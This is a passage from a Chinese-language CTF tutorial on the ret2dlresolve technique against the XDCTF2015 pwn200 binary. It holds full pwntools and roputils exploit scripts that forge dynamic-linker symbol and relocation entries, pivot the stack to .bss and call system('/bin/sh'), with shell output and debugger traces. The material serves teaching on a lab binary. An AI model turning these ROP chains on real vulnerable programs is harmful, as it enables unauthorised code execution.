0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
```

 而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。

与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。

那自然的，我们就可以调用目标函数。

这里，我们可以通过调整 base_stage 来达到相应的目的。

- 首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。
- 那么，这也就说明原先的符号表偏移少了对应的个数。
- 因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

最终如下

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27967
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 5

这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

效果如下

```shell
❯ python stage5.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27994
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。

##### stage 6

这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 `_dl_runtime_resolve` 函数最终是依赖函数名来解析目标地址的。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct ropchain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
r.sendline(rop.chain())
r.interactive()
```

需要注意的是，这里我把 /bin/sh 的偏移修改为了 base_stage+82，这是因为 pwntools 会对齐字符串。如下面的 ropchain 所示，0x40 处多了两个 a，比较奇怪。

```
0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0042:           'aaaa' 'aaaaaaaaaaaaaa'
```

效果如下

```shell
❯ python stage6.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 28204
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a94a
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
0x001c:  '\x07u\x02\x00'
0x0020:           'aaaa' 'aaaa'
0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x0028: '\x00\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x12\x00\x00\x00'
0x0034:           'syst' 'system\x00'
0x0038:        'em\x00n'
0x003c:             'aa'
0x003e:           'aaaa' 'aaaaaaaaaaaaaaaaaa'
0x0042:           'aaaa'
0x0046:           'aaaa'
0x004a:           'aaaa'
0x004e:           'aaaa'
0x0052:           '/bin' '/bin/sh\x00'
0x0056:        '/sh\x00'
0x005a:           'aaaa' 'aaaaaaaaaa'
0x005e:           'aaaa'
0x0062:           'aaaa'
102
[*] Switching to interactive mode
/bin/sh: 1: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

#### 基于工具伪造

根据上面的介绍，我们应该可以理解这个攻击了。

##### Roputil

下面我们直接使用 roputil 来进行攻击。代码如下

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。

效果如下

```shell
❯ python roptool.py
[+] Starting local process './main_partial_relro_32': pid 24673
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  42 6a 63 57  32 34 75 7a  30 64 6d 71  45 54 50 31  │BjcW│24uz│0dmq│ETP1│
    00000010  42 63 4b 61  4c 76 5a 35  38 77 79 6d  4c 62 34 74  │BcKa│LvZ5│8wym│Lb4t│
    00000020  56 47 4c 57  62 67 55 4b  65 57 4c 64  34 62 6f 47  │VGLW│bgUK│eWLd│4boG│
    00000030  43 47 59 65  4f 41 73 4c  61 35 79 4f  56 47 51 71  │CGYe│OAsL│a5yO│VGQq│
    00000040  59 53 47 69  6e 68 62 35  6f 33 4a 6e  31 77 66 68  │YSGi│nhb5│o3Jn│1wfh│
    00000050  45 6f 38 6b  61 46 46 38  4f 67 6c 62  61 41 58 47  │Eo8k│aFF8│Oglb│aAXG│
    00000060  66 7a 4b 30  63 6d 43 43  74 73 4d 7a  52 66 58 63  │fzK0│cmCC│tsMz│RfXc│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···│
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  35 45 4e 50  6e 51 51 4b  │/bin│/sh·│5ENP│nQQK│
    00000010  74 30 57 47  62 55 49 54  54 a0 04 08  07 e9 01 00  │t0WG│bUIT│T···│····│
    00000020  6c 30 39 79  68 4c 58 4b  00 1e 00 00  00 00 00 00  │l09y│hLXK│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 7a  │····│····│syst│em·z│
    00000040  32 45 74 78  75 35 59 6a  55 6b 54 74  63 46 70 71  │2Etx│u5Yj│UkTt│cFpq│
    00000050  32 42 6f 4c  43 53 49 33  75 47 59 53  7a 76 63 6b  │2BoL│CSI3│uGYS│zvck│
    00000060  44 43 4d 41                                         │DCMA│
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9f bytes:
    'exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n'
    'ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n'
    'main_partial_relro_32  stage1.py     stage4.py\n'
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

##### pwntools

这里我们使用 pwntools 的工具进行攻击。

```python
from pwn import *
context.binary = elf = ELF("./main_partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./main_partial_relro_32")
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

结果如下

```shell
❯ python exp-pwntools.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[+] Starting local process './main_partial_relro_32': pid 24688
[*] Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

### Full RELRO

在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。

那有没有什么办法可以绕过这样的防护呢？请读者自己思考。

## 64 位例子

### NO RELRO

在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。

1. 在 bss 段伪造栈。栈中的数据为
    1. 修改 .dynamic 节中字符串表的地址为伪造的地址
    2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
    3. 在特定的位置读取 /bin/sh 字符串。
    4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而触发执行 system 函数。
2. 栈迁移到 bss 段。

由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())

# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

直接运行，发现不行，经过调试发现程序在 0x7f2512db3e69 处崩了。

```assembly
 RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 ('aaaaaaaa')
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 ('aaaaaaaa')
 R13  0x6161616161616161 ('aaaaaaaa')
 R14  0x6161616161616161 ('aaaaaaaa')
 R15  0x6161616161616161 ('aaaaaaaa')
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191>
```

经过逐步调试发现，在 `_dl_runtime_resolve` 会在栈中保存大量的数据

```assembly
.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
```

其中 qword_227808 处的值为0x0000000000000380。

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 <_rtld_global_ro+168>:	0x0000000000000380
```

当执行完下面的指令后

```assembly
 ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
```

栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。

```
   0x7f2512dbb7a0 <_dl_runtime_resolve_xsavec>       push   rbx
   0x7f2512dbb7a1 <_dl_runtime_resolve_xsavec+1>     mov    rbx, rsp
   0x7f2512dbb7a4 <_dl_runtime_resolve_xsavec+4>     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
 ► 0x7f2512dbb7af <_dl_runtime_resolve_xsavec+15>    mov    qword ptr [rsp], rax <0x600a00>
   0x7f2512dbb7b3 <_dl_runtime_resolve_xsavec+19>    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 <_dl_runtime_resolve_xsavec+24>    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd <_dl_runtime_resolve_xsavec+29>    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 <_dl_runtime_resolve_xsavec+34>    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 <_dl_runtime_resolve_xsavec+39>    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* '`' */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */
```

或许我们可以考虑把栈再迁移的高一些，但是，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时

- bss 段的起始地址为 0x600B30
- 伪造的栈的数据一共有 392 （0x188）

所以直接栈迁移到 bss节很容易出现问题。

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

但经过精细的调节，我们还是避免破坏 .dynamic 节的内容

- 修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30
- 修改迁移后的栈的大小为 0x188

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x188 # new stack size is 0x188
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
gdb.attach(io)
